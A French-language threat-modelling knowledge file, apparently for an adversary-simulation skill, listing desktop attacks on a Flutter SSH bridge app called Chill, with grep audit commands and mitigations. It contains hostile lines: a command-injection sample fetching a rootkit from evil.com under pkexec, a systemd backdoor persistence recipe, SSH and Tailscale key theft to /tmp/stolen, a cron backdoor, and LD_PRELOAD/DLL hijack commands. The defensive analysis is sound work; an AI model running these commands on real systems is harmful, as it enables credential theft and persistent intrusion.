# Attaques Specifiques Desktop -- Base de connaissance offensive
# Skill : adversary-simulation | Fichier knowledge
# Plateformes : Windows 10/11, Linux (Ubuntu/Debian/Fedora/Arch), macOS 11+
# Architecture cible : Mobile -> Tailscale mesh -> Desktop Bridge (Chill) -> PC cible via SSH

> **Source** : Extractions de CYBERSEC_DESKTOP.md

---

## TABLE DES MATIERES

1. [Absence de sandbox Flutter Desktop](#1--absence-de-sandbox-flutter-desktop)
2. [DLL Injection / Side-Loading (Windows)](#2--dll-injection--side-loading-windows)
3. [LD_PRELOAD (Linux)](#3--ld_preload-linux)
4. [DYLD_INSERT_LIBRARIES (macOS)](#4--dyld_insert_libraries-macos)
5. [IPC Attacks -- Named Pipes, Unix Sockets, D-Bus](#5--ipc-attacks)
6. [Elevation de privileges via l'app](#6--elevation-de-privileges-via-lapp)
7. [Manipulation de la configuration OS](#7--manipulation-de-la-configuration-os)
8. [Go daemon tsnet -- surface d'attaque](#8--go-daemon-tsnet)
9. [Reverse engineering desktop](#9--reverse-engineering-desktop)
10. [Process hollowing et injection](#10--process-hollowing-et-injection)
11. [Autostart et persistance](#11--autostart-et-persistance)
12. [Evil Maid et acces physique desktop](#12--evil-maid-et-acces-physique)
13. [Chaines d'attaque desktop](#13--chaines-dattaque-desktop)

---

## 1 -- Absence de sandbox Flutter Desktop

### Vulnerabilite CRITIQUE

Contrairement au mobile (Android sandbox, iOS sandbox), les apps Flutter Desktop **n'ont PAS de sandbox native**. L'app tourne avec les **memes privileges** que l'utilisateur.

### Ce qu'une app desktop compromise peut acceder

| Cible | Chemin | Contenu |
|-------|--------|---------|
| Cles SSH utilisateur | `~/.ssh/` | TOUTES les cles privees SSH |
| Config SSH | `~/.ssh/config` | Hotes, utilisateurs, tunnels |
| Known hosts | `~/.ssh/known_hosts` | Empreintes de tous les serveurs |
| Credentials WiFi | Stockage OS | Mots de passe WiFi |
| Tokens de session | `~/.config/`, `~/.local/share/` | Tokens d'autres apps |
| Keystores locaux | Variable | Secrets d'autres apps |
| Navigateur | `~/.config/google-chrome/` | Cookies, mots de passe, historique |
| Documents | `~/Documents/`, `~/Downloads/` | Fichiers personnels |

### Consequence

Une seule vulnerabilite dans l'app desktop = **compromission totale** de l'environnement utilisateur.

### Audit

```bash
grep -rn "Directory\|File\|Process.run\|dart:io" --include="*.dart" .
grep -rn "AppArmor\|SELinux\|sandbox\|seccomp" --include="*.dart" --include="*.conf" .
```

**Source** : CYBERSEC_DESKTOP.md section 4.1

---

## 2 -- DLL Injection / Side-Loading (Windows)

### Vulnerabilite (CWE-427)

L'ordre de recherche des DLL sur Windows est exploitable :

```
1. Repertoire de l'executable       <-- ATTAQUANT place sa DLL ici
2. Repertoire systeme (System32)
3. Repertoire Windows
4. Repertoire courant
5. PATH
```

### DLLs cibles

| DLL | Usage | Risque |
|-----|-------|--------|
| `version.dll` | Frequemment chargee par les apps Windows | Hijack facile |
| `dwmapi.dll` | Desktop Window Manager | Hijack facile |
| `winmm.dll` | Multimedia | Hijack facile |
| `flutter_windows.dll` | Flutter engine | Impact direct sur l'app |

### Scenario d'attaque

```cmd
REM L'attaquant place une DLL malveillante dans le dossier de l'app
copy malicious.dll "C:\Program Files\Chill\version.dll"

REM Au prochain lancement, la DLL malveillante est chargee
REM Elle intercepte les appels crypto et exfiltre les cles SSH
```

### Impact specifique

Si le pont FFI charge une bibliotheque detournable, l'attaquant accede a :
- `flutter_secure_storage` et aux cles SSH
- Toutes les operations cryptographiques de dartssh2
- Les communications Platform Channels

### Audit

```bash
grep -rn "DynamicLibrary\|loadLibrary\|ffi\|dlopen\|LoadLibrary" --include="*.dart" .
```

**Source** : CYBERSEC_DESKTOP.md section 4.2

---

## 3 -- LD_PRELOAD (Linux)

### Vulnerabilite (CWE-426)

`LD_PRELOAD` force le chargement d'un objet partage avant tous les autres. L'attaquant intercepte les appels a glibc ou libssl.

```bash
# L'attaquant cree une bibliotheque malveillante
# Elle wrappe write() pour capturer les donnees avant chiffrement

export LD_PRELOAD=/tmp/libhook.so
/opt/chill/chill_desktop

# Toutes les donnees SSH passent par libhook.so AVANT le chiffrement
# Cles privees, mots de passe, commandes captures en clair
```

### Protections a verifier

```bash
# L'app devrait verifier LD_PRELOAD au demarrage
grep -rn "LD_PRELOAD\|DYLD_INSERT" --include="*.dart" .
```

**Source** : CYBERSEC_DESKTOP.md section 4.3

---

## 4 -- DYLD_INSERT_LIBRARIES (macOS)

### Vulnerabilite

Equivalent macOS de LD_PRELOAD :

```bash
DYLD_INSERT_LIBRARIES=/tmp/malicious.dylib /Applications/Chill.app/Contents/MacOS/Chill
```

### Protections macOS

- Hardened runtime (entitlement) desactive les injections
- Gatekeeper verifie les signatures
- Mais si l'app n'est pas signee ou si SIP est desactive, l'injection fonctionne

---

## 5 -- IPC Attacks

### Vulnerabilite (CWE-419)

Sur desktop, Flutter utilise des mecanismes IPC natifs. Un processus local malveillant peut ecouter ou injecter des commandes.

| OS | Mecanisme IPC | Risque |
|----|--------------|--------|
| Windows | Named pipes | Enumerable par tout processus |
| Linux | Unix sockets, D-Bus | D-Bus expose des interfaces |
| macOS | XPC, Mach ports | XPC accessible sous conditions |

### Scenario d'attaque

1. Le malware identifie les canaux IPC utilises par Chill
2. Il ecoute les communications inter-processus
3. Il intercepte les commandes SSH transmises via IPC
4. Il injecte ses propres commandes dans le flux

### Audit

```bash
grep -rn "MethodChannel\|EventChannel\|BasicMessageChannel\|platform_channel" --include="*.dart" .
grep -rn "pipe\|socket\|dbus\|xpc" --include="*.dart" --include="*.go" .
```

**Source** : CYBERSEC_DESKTOP.md section 4.5

---

## 6 -- Elevation de privileges via l'app

### Vulnerabilite (CWE-269)

L'app desktop configure l'OS avec des **privileges eleves** :
- **Linux** : `pkexec` (PolicyKit)
- **Windows** : `PowerShell -Verb RunAs`
- **macOS** : `osascript with administrator privileges`

### Risques

Si l'app demande l'elevation pour configurer l'OS (SSH, firewall, WOL, hardening), et que les parametres sont manipulables :

```dart
// VULNERABLE -- commande construite par concatenation avec privileges root
final cmd = 'ufw allow from $ip to any port $port';
Process.run('pkexec', ['/bin/sh', '-c', cmd]);

// L'attaquant injecte dans $ip :
// 0.0.0.0/0; ufw disable; wget http://evil.com/rootkit
// -> Execute avec privileges root !
```

### Impact

Injection de commande avec privileges root/admin = **compromission totale** de l'OS.

### Audit

```bash
grep -rn "pkexec\|RunAs\|osascript\|administrator\|sudo\|Process.run" --include="*.dart" .
```

**Source** : CYBERSEC_DESKTOP.md sections 7.1, 7.2, 12.1

---

## 7 -- Manipulation de la configuration OS

### Vecteur d'attaque

L'app desktop ecrit des fichiers de configuration systeme :
- `sshd_config` -- configuration du serveur SSH
- Regles firewall (`ufw`, `iptables`, Windows Firewall)
- Configuration WOL (BIOS/UEFI settings)
- Hardening OS (desactivation de services)

### Scenario d'attaque

1. L'attaquant intercepte la communication mobile -> desktop
2. Il modifie les parametres de configuration en transit
3. Le desktop applique la config malveillante avec privileges eleves :
   - `PermitRootLogin yes`
   - `PasswordAuthentication yes`
   - Pare-feu desactive
   - Cle SSH de l'attaquant ajoutee dans `authorized_keys`

### Audit

```bash
grep -rn "sshd_config\|authorized_keys\|ufw\|iptables\|firewall" --include="*.dart" .
grep -rn "File.*write\|writeAsString\|writeAsBytes" --include="*.dart" .
```

**Source** : CYBERSEC_DESKTOP.md sections 7.3, 12

---

## 8 -- Go daemon tsnet

### Surface d'attaque

Le daemon Go tsnet integre dans Chill fait du PC un noeud Tailscale autonome. Il expose :

| Surface | Description | Risque |
|---------|------------|--------|
| API locale HTTP | Port 41112 par defaut | CSRF, DNS Rebinding |
| Fichier d'etat | `tailscaled.state` | Cles WireGuard en clair |
| Variables d'env | `TS_AUTHKEY`, `TS_STATE_DIR` | Fuite de credentials |
| Socket IPC | Communication avec l'app Flutter | Interception possible |

### Scenario d'attaque

```bash
# Extraire les cles WireGuard depuis le fichier d'etat
cat /var/lib/tailscale/tailscaled.state
# Contient les cles privees WireGuard du noeud

# Acceder a l'API locale
curl http://localhost:41112/localapi/v0/status
# Informations sur le tailnet, les pairs, etc.
```

### Audit

```bash
grep -rn "tsnet\|tailscale\|41112\|localapi" --include="*.go" --include="*.dart" .
```

**Source** : CYBERSEC_DESKTOP.md sections 2.2, 2.3

---

## 9 -- Reverse engineering desktop

### Vulnerabilite (CWE-693)

Les binaires Flutter desktop sont **moins proteges** que les binaires mobiles :

| Aspect | Mobile | Desktop |
|--------|--------|---------|
| Obfuscation | `--obfuscate` disponible | `--obfuscate` disponible mais moins utilise |
| Anti-debug | freeRASP, root detection | Rarement implemente |
| Strip symbols | Standard | Pas toujours fait |
| Sandbox | OS-enforced | Aucune |

### Outils de reverse engineering

- **Blutter** : Analyse du binaire Flutter AOT (extrait symboles, constantes)
- **Ghidra / IDA** : Desassemblage classique
- **x64dbg / lldb** : Debugging en temps reel
- **Frida** : Instrumentation dynamique (fonctionne aussi sur desktop)

### Audit

```bash
# Verifier les options de build
grep -rn "obfuscate\|split-debug-info\|strip" --include="*.yaml" --include="*.gradle" .
```

**Source** : CYBERSEC_DESKTOP.md section 13

---

## 10 -- Process hollowing et injection

### Vulnerabilite (Windows)

Un attaquant peut injecter du code dans le processus Chill en cours d'execution :

1. **Process Hollowing** : Suspendre le processus, remplacer son code, reprendre l'execution
2. **Thread Injection** : Creer un thread distant dans le processus Chill
3. **APC Injection** : Injecter via les Asynchronous Procedure Calls

### Impact

Le code injecte herite des privileges et de l'acces aux donnees du processus Chill.

**Source** : CYBERSEC_DESKTOP.md section 4.4

---

## 11 -- Autostart et persistance

### Mecanismes de persistance par OS

| OS | Mecanisme | Chemin |
|----|----------|--------|
| Windows | Registry Run | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Windows | Startup folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |
| Windows | Scheduled Task | `schtasks /create` |
| Linux | .desktop autostart | `~/.config/autostart/` |
| Linux | systemd user service | `~/.config/systemd/user/` |
| Linux | cron | `crontab -e` |
| macOS | LaunchAgent | `~/Library/LaunchAgents/` |
| macOS | Login Items | Preferences Systeme |

### Scenario d'attaque

L'attaquant qui compromet le processus Chill installe une persistance :

```bash
# Linux -- service systemd utilisateur
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/backdoor.service << EOF
[Unit]
Description=System Helper
[Service]
ExecStart=/tmp/backdoor
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user enable backdoor
```

---

## 12 -- Evil Maid et acces physique

### Attaque par boot USB

```bash
# Boot depuis USB live Linux
mount /dev/sda2 /mnt

# Extraire les cles SSH
cp /mnt/home/user/.ssh/* /tmp/stolen/

# Extraire les donnees Chill
cp -r /mnt/home/user/.local/share/com.example.chill/ /tmp/stolen/

# Extraire les cles Tailscale
cp /mnt/var/lib/tailscale/tailscaled.state /tmp/stolen/

# Installer un backdoor persistant
echo "*/5 * * * * /tmp/backdoor.sh" >> /mnt/var/spool/cron/user
```

### Protections a verifier

- Chiffrement disque complet (BitLocker, LUKS, FileVault)
- Secure Boot actif
- Mot de passe BIOS/UEFI

**Source** : CYBERSEC_DESKTOP.md section 15.4

---

## 13 -- Chaines d'attaque desktop

### Chaine 1 : DLL injection + pivot lateral

```
DLL malveillante dans le dossier de l'app (Windows)
  -> Chargee au demarrage de Chill
  -> Intercepte les cles SSH via FFI
  -> Active le port forwarding SSH
  -> Pivot vers tout le LAN
  -> Persistance via Registry Run
```

### Chaine 2 : LD_PRELOAD + exfiltration totale (Linux)

```
LD_PRELOAD=/tmp/hook.so /opt/chill/chill
  -> Interception de TOUTES les operations crypto
  -> Capture cles SSH + tokens Tailscale
  -> Lecture de ~/.ssh/ (toutes les cles)
  -> Exfiltration vers C2
  -> Installation systemd backdoor
```

### Chaine 3 : Elevation de privileges + configuration malveillante

```
Injection dans les parametres de config (via MITM)
  -> L'app execute pkexec avec les parametres injectes
  -> sshd_config modifie : PermitRootLogin yes, PasswordAuth yes
  -> Pare-feu desactive
  -> Cle attaquant ajoutee dans authorized_keys
  -> Acces root permanent
```

### Chaine 4 : Supply chain + Go daemon

```
Package pub.dev compromis
  -> Code malveillant dans le binaire Chill
  -> Modification du daemon tsnet (Go)
  -> Le daemon enregistre un noeud fantome dans le tailnet
  -> L'attaquant a un acces permanent au mesh
  -> Il peut acceder a TOUS les services du tailnet
```

### Chaine 5 : Evil Maid + absence de sandbox + persistance

```
Acces physique au PC (boot USB si pas de chiffrement disque)
  -> Copie de ~/.ssh/, donnees Chill, tailscaled.state
  -> Installation rootkit/keylogger
  -> Au prochain boot, le keylogger capture le PIN/mot de passe
  -> L'attaquant a TOUTES les cles + le mot de passe
  -> Acces permanent et furtif
```

---

## 14 -- DLL Sideloading cas reel Flutter -- RustDesk (fevrier 2025)

### Premier cas documente sur une app Flutter desktop

**Application** : RustDesk (bureau distant base sur Flutter)
**Date** : Fevrier 2025

**Vecteur** : RustDesk charge `flutter_gpu_texture_renderer_plugin.dll` SANS verifier le chemin complet NI la signature. Un attaquant place une version malveillante dans le repertoire de l'executable (`%LOCALAPPDATA%\rustdesk\rustdesk.exe`).

**Resultat** : Execution de code dans le contexte d'un processus signe de confiance.

**References** :
- MITRE ATT&CK : T1574.001 (DLL Search Order Hijacking)
- Trend Micro : Technique documentee dans leurs recherches sur les malwares distribues via des cracks
- Regles Sigma : Des regles de detection ont ete publiees specifiquement pour ce cas

**Impact pour Chill** : TOUTE application Flutter Windows utilisant des plugins avec des DLL est potentiellement vulnerable. Chill utilise flutter_secure_storage, dartssh2, et potentiellement d'autres plugins natifs -- chaque DLL chargee est un vecteur.

**Defense requise** : Verification de signature de chaque DLL au chargement. Chemins absolus. `SetDefaultDllDirectories` + `LOAD_LIBRARY_SEARCH_SYSTEM32`. Code signing obligatoire.

---

## 15 -- unflutter -- Impact amplifie sur desktop

### Reverse engineering facilite sans aucune barriere

L'outil unflutter (Go, zboralski) a un impact AMPLIFIE sur desktop car :

1. Le binaire `libapp.so` (Linux/macOS) ou equivalent Windows est **directement accessible** sur le filesystem (pas besoin d'extraire depuis un APK)
2. **Pas de protections de l'OS** : Play Integrity / App Attest sont absents sur desktop
3. L'integration Ghidra avec convention `__dartcall` et retypage des registres ARM64 fonctionne directement

**Pipeline** : ELF → detection version/hash → replay des phases alloc/fill du snapshot Dart → desassemblage ARM64 avec CFG → export Ghidra avec structs classes Dart, registres ARM64 retypes (X26→THR, X27→PP, X28→HEAP_BASE)

**Resultat** : Le reverse engineering d'une app Flutter Desktop est maintenant PLUS FACILE que celui d'une app mobile.

---

## 16 -- Frida 17 -- Injection simplifiee sur desktop

### Moins d'obstacles que sur mobile

Frida 17 avec ses bridges externalises fonctionne aussi sur desktop. L'injection est encore plus simple que sur mobile car :

1. **Pas de SELinux/sandbox** a contourner (Windows/Linux sans sandbox)
2. Le processus Flutter peut etre attache directement
3. `ptrace` disponible sans restriction sur la plupart des configs Linux desktop

**Consequence** : Toutes les techniques Frida mobiles (hook crypto, bypass SSL, interception Platform Channels) fonctionnent sur desktop avec MOINS d'obstacles.

**Premier script Frida Flutter Windows** (Anof-cyber) : Cible specifiquement `flutter_windows.dll`. Ouvre la voie a l'instrumentation dynamique des apps Flutter Windows.

---

## 17 -- Cold boot attacks -- Viables DDR4/DDR5

### Remanence DRAM et extraction de secrets

**Source** : Recherche 3MDEB (2024-2025)

La remanence DRAM fonctionne avec DDR4 et DDR5. Apres extinction du PC, les donnees en memoire (incluant les cles SSH, tokens, secrets) persistent physiquement pendant plusieurs secondes a minutes.

**Impact desktop** : Un attaquant avec acces physique au PC peut extraire les secrets de la RAM apres extinction. Particulierement pertinent pour le desktop bridge qui detient les cles SSH.

**Mitigations matérielles** :
- **Intel TME** (Total Memory Encryption) -- chiffrement transparent de la RAM
- **AMD SME** (Secure Memory Encryption) -- equivalent AMD
- **TRESOR** -- stockage des cles dans les registres CPU au lieu de la RAM

**Mitigation applicative** : Dart n'offre AUCUN mecanisme de chiffrement memoire. Zeroisation active des secrets en memoire (meme si imparfaite a cause du GC Dart). Allocation via FFI pour les secrets critiques.

---

## 18 -- Absence de sandbox -- Analyse approfondie par OS

### 18.1 Windows -- Aucun sandbox par defaut

L'application Flutter Desktop s'execute avec les **pleins privileges utilisateur**. Acces complet au systeme de fichiers, registre Windows, APIs Win32.

**Packaging MSIX** (Microsoft Store) : Offre une isolation limitee, mais la majorite des apps Flutter sont distribuees HORS Store.

**Si l'app est compromise** : Acces a `~/.ssh/`, credentials WiFi, tokens de session d'autres apps, keystores locaux, registre Windows (potentiellement persistance).

### 18.2 Linux -- Depend du format de distribution

- **Sans sandbox** : `.deb`, AppImage → acces complet
- **Avec sandbox** : Snap et Flatpak offrent un sandboxing

**Recommandation** : Distribuer en Snap/Flatpak pour beneficier du sandboxing, pas en .deb ou AppImage.

### 18.3 macOS -- Meilleure posture mais complexe

**App Sandbox** + **Hardened Runtime** d'Apple : Requis pour la notarisation.

**Problemes documentes** : GitHub issue #163565 (fevrier 2025) -- problemes d'App Sandbox lors de la soumission App Store pour les apps Flutter. La configuration est complexe et peut pousser les developpeurs a desactiver le sandbox pour contourner les problemes.

---

## 19 -- Lazarus/BlueNoroff macOS -- Malware Flutter etatique sur desktop

### 19.1 Premier malware Flutter etatique sur desktop

**Decouvert** : Jamf Threat Labs, novembre 2024

Malware macOS deguise en jeu de demineur ("New Updates in Crypto Exchange"). Code Flutter contactant `mbupdate[.]linkpc[.]net` (infrastructure DPRK connue) pour telecharger et executer des payloads AppleScript.

**Fait alarmant** : Les applications etaient **signees et notarisees par Apple** avant revocation. La notarisation Apple ne verifie pas le comportement, seulement les malwares connus.

### 19.2 Impact direct pour Chill desktop macOS

1. Un attaquant pourrait creer une version clonee de l'app desktop
2. La faire signer et notariser (Apple ne verifie pas le comportement)
3. La distribuer comme mise a jour legitime
4. L'utilisateur installe une app qui ressemble exactement a la vraie mais exfiltre les cles SSH

### 19.3 Pourquoi Flutter facilite ce type d'attaque

- **Compilation AOT** : Le binaire est opaque meme pour les analystes macOS
- **TLS statique** : Le malware peut bypasser les inspections reseau de macOS car BoringSSL est compile statiquement
- **Taille du binaire** : Plusieurs dizaines de Mo -- indistinguable entre code applicatif et framework
- Les EDR ne peuvent pas differencier une app Flutter legitime d'une malveillante par analyse statique

---

## 20 -- Fluhorse desktop -- Remplacement d'app et opacite format

### Impact sur la detection desktop

Le malware Fluhorse utilise DELIBEREMENT Flutter comme mecanisme anti-analyse. Si distribue comme app desktop :
- Les outils d'analyse traditionnels (antivirus, EDR) ont du mal a inspecter le contenu du snapshot Dart
- Un attaquant pourrait remplacer l'app par une version malveillante Flutter qui passerait les controles EDR grace a l'opacite du format

---

## 21 -- Flutter comme vecteur d'evasion desktop

### 21.1 Proprietes d'evasion specifiques au desktop

- **Registres non-standard** : VM Dart utilise R15 au lieu de SP sur ARM → les decompilateurs produisent du pseudo-code errone
- **Snapshot Dart** : Le format change a chaque version SDK → les outils d'analyse doivent etre mis a jour constamment
- **Linkage statique** : Les bibliotheques sont integrees au binaire → pas de DLL/SO separees analysables
- **BoringSSL statique** : Flutter n'utilise PAS la pile TLS native du systeme → les proxies reseau de l'OS ne peuvent pas inspecter le trafic

### 21.2 Impact sur les outils de detection

| Outil | Efficacite contre Flutter |
|-------|--------------------------|
| **Windows Defender / EDR** | Difficulte a analyser le snapshot Dart. Regles YARA basees sur chaines inefficaces |
| **macOS XProtect** | Signatures YARA de malwares Flutter connus trop specifiques pour les variantes |
| **Linux ClamAV** | Pas de signatures Flutter specifiques |

**Consequence** : La verification d'integrite DOIT se faire au niveau applicatif (hash du binaire) et au niveau reseau (attestation mutuelle mobile <-> desktop), PAS au niveau OS seul.

### 21.3 Statistiques FrameWar (ActiveFence)

- **333 000** apps Flutter actives
- **3,5 milliards** d'installations cumulees
- **24%** des nouvelles apps utilisent Flutter

Les EDR et antivirus ne peuvent pas flaguer "binaire Flutter" sans declencher des faux positifs sur un quart des nouvelles apps.

---

## 22 -- CanvasKit CSP (Flutter Web -- informatif)

**Note** : Flutter 3.29 (fevrier 2025) a supprime le renderer HTML. CanvasKit est le seul moteur de rendu.

**Impact** : CanvasKit necessite `'wasm-unsafe-eval'` dans la directive `script-src` de la CSP.

**Pertinence** : N'affecte PAS directement l'app desktop native, mais si une interface web est prevue, la CSP sera affaiblie.

---

## Chaines d'attaque desktop (MISE A JOUR 2026)

### Chaine 6 : DLL Sideloading Flutter + pivot (cas RustDesk applique a Chill)

```
Identification des DLLs Flutter chargees par Chill
  -> flutter_gpu_texture_renderer_plugin.dll ou autre plugin DLL
  -> Placement de la DLL malveillante dans le repertoire de l'app
  -> Code malveillant execute dans le processus signe
  -> Acces a flutter_secure_storage et cles SSH
  -> Pivot LAN via SSH tunneling
  -> Regles Sigma publiees pour ce pattern d'attaque
```

### Chaine 7 : Cold boot + extraction memoire

```
Acces physique au PC
  -> Extinction du PC (ou interruption alimentation)
  -> Boot immediat depuis USB avec outil d'extraction memoire
  -> Remanence DRAM DDR4/DDR5 : secrets encore presents
  -> Extraction cles SSH, tokens Tailscale, cles de session
  -> Pas de protection TME/SME activee sur la majorite des postes
  -> Compromission totale meme avec chiffrement disque actif
```

### Chaine 8 : Lazarus-style clone d'app macOS

```
L'attaquant clone l'app Chill desktop macOS
  -> Injection de code malveillant dans le Flutter binaire
  -> Signature et notarisation Apple (ne verifie pas le comportement)
  -> Distribution via phishing comme "mise a jour"
  -> L'utilisateur installe la fausse app
  -> Exfiltration silencieuse des cles SSH et tokens
  -> EDR/XProtect incapables de differencier l'app clone
```

---

## Sources

- CYBERSEC_DESKTOP.md -- Sections 4, 7, 12, 13, 15
- 1_COMPLEMENT_DESKTOP_2026.md -- Complement recherche securite desktop (fevrier 2026)
- 2_COMPLEMENT_DESKTOP_2_2026.md -- Complement #2 framework, dartssh2, malwares desktop (fevrier 2026)
- CWE-427 : Uncontrolled Search Path Element
- CWE-426 : Untrusted Search Path
- CWE-419 : Unprotected Primary Channel
- CWE-269 : Improper Privilege Management
- MITRE ATT&CK : T1574 (Hijack Execution Flow), T1574.001 (DLL Search Order Hijacking), T1055 (Process Injection)
- RustDesk DLL Sideloading : Trend Micro (fevrier 2025), regles Sigma publiees
- 3MDEB : Recherche cold boot attacks DDR4/DDR5 (2024-2025)
- Jamf Threat Labs : Lazarus/BlueNoroff Flutter macOS (novembre 2024)
- ActiveFence FrameWar : Rapport Flutter malware 2025
- Anof-cyber : Premier script Frida Flutter Desktop Windows
- GitHub issue #163565 : App Sandbox Flutter macOS (fevrier 2025)
